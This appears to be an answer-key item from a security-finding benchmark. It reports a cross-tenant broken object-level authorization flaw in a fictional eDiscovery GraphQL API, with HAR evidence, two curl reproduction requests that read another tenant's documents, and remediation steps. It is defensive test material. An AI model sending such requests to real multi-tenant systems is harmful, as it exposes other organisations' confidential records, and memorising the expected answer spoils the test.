# Expected Response

## System
- Domain: Legal Tech / eDiscovery
- System: LexVault eDiscovery API
- Example ID: GQL-0074

## Priority Findings

### Finding 1: Cross-Tenant Legal Document Batch/Bulk Lookup Without Per-ID Ownership Filter (Pattern 1.9)
**Severity:** Critical
**Category:** BOLA / Batch Lookup

**Summary:**
Per §5.0 (Pattern 1.9 — batch/bulk lookup endpoints): The `bulkResourceLookup` mutation and `getResource` query lack per-ID ownership filtering. An attacker from `tenant-8ea4` accessed eDiscovery document record `R-2074` belonging to `tenant-6926`. In a legal eDiscovery platform, this exposes privileged legal documents, case strategy materials, and attorney-client communications that carry legal privilege and confidentiality obligations.

**Evidence from HAR:**
- Request: `POST https://api.lexvault-ediscovery.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-8ea4`
- Query: `getResource(id: "R-2074") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-6926"`, `ownerId: "other-user-8ea46926"`, `sensitiveField: "CONFIDENTIAL-8ea46926"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-8ea46926`

**Root Cause (§4.0 RISK-GQL-074):** `getResource` resolver fetches by `resourceId` only; `bulkResourceLookup` accepts arbitrary arrays without per-ID filtering.

## Steps to Reproduce

### Step 1 — Cross-tenant legal document access (HAR)
```bash
curl -s -X POST https://api.lexvault-ediscovery.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-8ea4" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2074\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-8ea46926` from `tenant-6926`. **Secure:** FORBIDDEN.

### Step 2 — Batch lookup across case document IDs
```bash
curl -s -X POST https://api.lexvault-ediscovery.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-8ea4" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2074\", \"R-1074\", \"R-3074\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns case documents from `tenant-6926` — attorney-client privilege breach.

## Remediation
1. Resolver tenant guard on `getResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Per-ID ownership filter in `bulkResourceLookup`: reject each ID where tenantId != JWT.tenantId.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
4. Audit log all access to legal documents with requesting user's JWT sub.
